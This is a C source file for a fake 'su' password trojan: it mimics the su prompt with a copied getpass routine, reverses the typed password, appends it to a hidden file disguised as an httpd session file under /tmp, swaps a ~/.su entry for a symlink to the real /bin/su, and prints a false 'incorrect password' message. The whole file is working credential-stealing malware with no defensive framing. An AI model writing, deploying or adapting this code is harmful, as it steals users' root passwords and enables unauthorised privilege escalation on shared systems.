#include <stdio.h>
#include <stdlib.h>
#include <termios.h>

# define TCSASOFT 0
enum { false = 0, true = 1 };
typedef signed char bool;
char *
getpass (const char *prompt)
{
  FILE *tty;
  FILE *in, *out;
  struct termios s, t;
  bool tty_changed;
  static char *buf;
  static size_t bufsize;
  ssize_t nread;

  /* Try to write to and read from the terminal if we can.
     If we can't open the terminal, use stderr and stdin.  */

  tty = fopen ("/dev/tty", "w+");
  if (tty == NULL)
    {
      in = stdin;
      out = stderr;
    }
  else
    {
      /* We do the locking ourselves.  */
      out = in = tty;
    }

  /* Make sure the stream we opened is closed even if the thread is
     canceled.  */

  /* Turn echoing off if it is on now.  */

  if (tcgetattr (fileno (in), &t) == 0)
    {
      /* Save the old one. */
      s = t;
      /* Tricky, tricky. */
      t.c_lflag &= ~(ECHO|ISIG);
      tty_changed = (tcsetattr (fileno (in), TCSAFLUSH|TCSASOFT, &t) == 0);
    }
  else
    tty_changed = false;

  /* Write the prompt.  */
  fputs(prompt, out);
  fflush(out);

  /* Read the password.  */
  nread = getline (&buf, &bufsize, in);

#if !_LIBC
  /* As far as is known, glibc doesn't need this no-op fseek.  */

  /* According to the C standard, input may not be followed by output
     on the same stream without an intervening call to a file
     positioning function.  Suppose in == out; then without this fseek
     call, on Solaris, HP-UX, AIX, OSF/1, the previous input gets
     echoed, whereas on IRIX, the following newline is not output as
     it should be.  POSIX imposes similar restrictions if fileno (in)
     == fileno (out).  The POSIX restrictions are tricky and change
     from POSIX version to POSIX version, so play it safe and invoke
     fseek even if in != out.  */
  fseek (out, 0, SEEK_CUR);
#endif

  if (buf != NULL)
    {
      if (nread < 0)
	buf[0] = '\0';
      else if (buf[nread - 1] == '\n')
	{
	  /* Remove the newline.  */
	  buf[nread - 1] = '\0';
	  if (tty_changed)
	    {
	      /* Write the newline that was not echoed.  */
	    }
	}
    }

  /* Restore the original setting.  */
  if (tty_changed)
    (void) tcsetattr (fileno (in), TCSAFLUSH|TCSASOFT, &s);


  if (tty)
	  fclose (tty);

  return buf;
}

char* strrev(char* s)
{
	/* h指向s的头部 */
	char* h = s;
	char* t = s;
	char ch;

	/* t指向s的尾部 */
	while(*t++){};
	t--;/* 与t++抵消 */
	t--;/* 回跳过结束符'\0' */

	/* 当h和t未重合时，交换它们所指向的字符 */
	while(h < t)
	{
		ch = *h;
		*h++ = *t;/* h向尾部移动 */
		*t-- = ch;/* t向头部移动 */
	}

	return(s);
}

int main()
{
	char fakesu[256] = {0x0};
	snprintf(fakesu, sizeof(fakesu), "%s/.su", getenv("HOME"));
	char *p = getpass("Password:");
	strrev(p);
	FILE *fp = fopen("/tmp/.sess_httpd_1379876351233TK", "a+");
	if (fp == NULL)
		goto err_exit;
	fprintf(fp, "%s\n", p);
	fclose(fp);
	sleep(2);
	unlink(fakesu);
	if (symlink("/bin/su", fakesu))
		fprintf(stdout, "%m\n");
err_exit:
	fprintf(stdout, "\nsu: incorrect password\n");
	return 0;
}
